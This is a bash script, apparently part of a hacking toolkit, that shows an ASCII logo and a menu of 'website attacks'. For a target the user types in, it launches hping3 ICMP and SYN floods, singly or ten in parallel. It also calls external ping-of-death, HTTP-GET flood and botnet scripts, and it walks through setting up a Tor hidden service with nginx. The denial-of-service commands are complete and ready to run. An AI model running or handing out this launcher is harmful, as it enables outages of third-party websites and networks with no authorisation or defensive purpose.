#! /bin/bash

echo "
................................................................................
.............................#@@@@@@@@@@@@@@@@@@@@@(............................
.......................@@@@@@@@@@@@@@@,@@@.@@@@@@@@@@@@@@@......................
...................@@@@@@@&....@@@@@...@@@...@@@@@....@@@@@@@@..................
...............&@@@@@@.......@@@@@.....@@@.....@@@@@.......@@@@@@/..............
.............@@@@@..........@@@@.......@@@.......@@@@@........,@@@@@............
..........&@@@@%..........@@@@/........@@@.........@@@@..........@@@@@*.........
........*@@@@@@..........@@@@..........@@@..........@@@@@.........@@@@@@........
.......@@@@.@@@@@@@,...*@@@@...........@@@............@@@@.../@@@@@@@/@@@@......
.....,@@@@......@@@@@@@@@@&............@@@.............@@@@@@@@@@......@@@@.....
....@@@@#............@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@............@@@@#...
...@@@@/.............@@@@....%@@@@@@@@@@@@@@@@@@@@@(.....@@@#............&@@@*..
...@@@@.............@@@@...............@@@...............@@@@.............@@@@..
..@@@@..............@@@@...............@@@................@@@@.............@@@@.
..@@@&.............#@@@................@@@................@@@@.............@@@@.
.#@@@..............@@@@................@@@................@@@@..............@@@.
.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(
.#@@@..............@@@@................@@@................@@@@..............@@@.
..@@@&.............#@@@................@@@................@@@@.............@@@@.
..@@@@..............@@@@...............@@@................@@@@.............@@@@.
...@@@@.............@@@@...............@@@...............@@@@.............@@@@..
...%@@@(.............@@@@..........,&@@@@@@&%............@@@#............@@@@...
....&@@@@.............@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@............@@@@/...
......@@@@........@@@@@@@@@@@..........@@@..........@@@@@@@@@@@........@@@@.....
.......@@@@,.%@@@@@@@%..@@@@...........@@@............@@@@.&@@@@@@@/.%@@@@......
.........@@@@@@@@........@@@@..........@@@..........@@@@@.......@@@@@@@@........
........../@@@@@..........@@@@@........@@@.........@@@@..........@@@@@,.........
.............@@@@@*.........@@@@.......@@@.......@@@@@........%@@@@@............
...............*@@@@@@.......&@@@@.....@@@.....@@@@@.......@@@@@@,..............
...................@@@@@@@@....@@@@@...@@@...@@@@@....@@@@@@@@..................
.......................@@@@@@@@@@@@@@@@@@@.@@@@@@@@@@@@@@@......................
.............................,@@@@@@@@@@@@@@@@@@@@@.............................
"
echo "You chose the website attacks section! choose an attack below"
echo "------------------------------------------"
echo "Hping3 ICMP attack(1)"
echo "------------------------------------------"
echo "Multiple Hping3 ICMP attacks(2)"
echo "------------------------------------------"
echo "Ping of Death attack(3)"
echo "------------------------------------------"
echo "SYN attack(4)"
echo "------------------------------------------"
echo "Multiple SYN attacks(5)"
echo "------------------------------------------"
echo "HTTP-Get attack(6)"
echo "------------------------------------------"
echo "BotNet attacks(7)"
echo "------------------------------------------"
echo "Host Tor site(8)"
echo "------------------------------------------"




















read ATTACKTY

if [[ $ATTACKTY == '1' ]]
then
    echo "Enter target IP/DOMAIN"
    read TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
fi

if [[ $ATTACKTY == '2' ]]
then
    echo "Enter target IP/DOMAIN"
    read TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
    konsole -e sudo hping3 -1 --flood $TARIP
fi

if [[ $ATTACKTY == '3' ]]
then
    konsole -e python3 pingofdeath.py
fi

if [[ $ATTACKTY == '4' ]]
then
    echo "Enter target IP/DOMAIN"
    read TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP

fi

if [[ $ATTACKTY == '5' ]]
then
    echo "Enter target IP/DOMAIN"
    read TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
    konsole -e sudo hping3 -d 200 -p 80 -S --flood $TARIP
fi

if [[ $ATTACKTY == '6' ]]
then
    echo "Enter Target IP/DOMAIN"
    read TARIP
    konsole -e python3 saphyra.py $TARIP

fi

if [[ $ATTACKTY == '7' ]]
then
    clear
    ./botnets.sh
    bash botnets.sh
fi

if [[ $ATTACKTY == '8' ]]
then
    clear
    echo "IF YOU USED THIS BEFORE JUST DO sudo service tor start AND sudo service nginx start TO START YOUR SITE"
    sleep 2
    echo "This will host a hidden-service tor site"
    echo "Use service tor stop  service nginx stop   to stop it"
    sleep 1
    sudo apt install tor
    sudo apt install nginx
    clear
    echo "Scroll down and uncomment HiddenServiceDir and HiddenServicePort, if there are none exit out of it"
    sleep 3
    sudo nano /etc/tor/torrc
    sleep 1
    sudo service tor stop
    sudo service tor start
    sudo service tor status
    sudo cat /var/lib/tor/hidden_service/hostname
    echo "This is your onion address, now we're gonna add some html code to it!"
    sleep 3
    sudo service tor stop
    echo "Scroll down and uncomment server_tokens off;  and server_name_in_redirect off"
    sleep 5
    sudo nano /etc/nginx/nginx.conf
    sleep 2
    sudo service nginx restart
    cd /var/www/html
    sudo rm index.nginx-debian.html
    sudo touch index.html
    echo "Please enter your site's HTML code if you've ran this command before just CTRL+C out of it, if you wish to add CSS.. cd into /var/www/html "
    sleep 5
    nano index.html
    sudo service nginx start
    sudo service tor start
    sudo service tor status

fi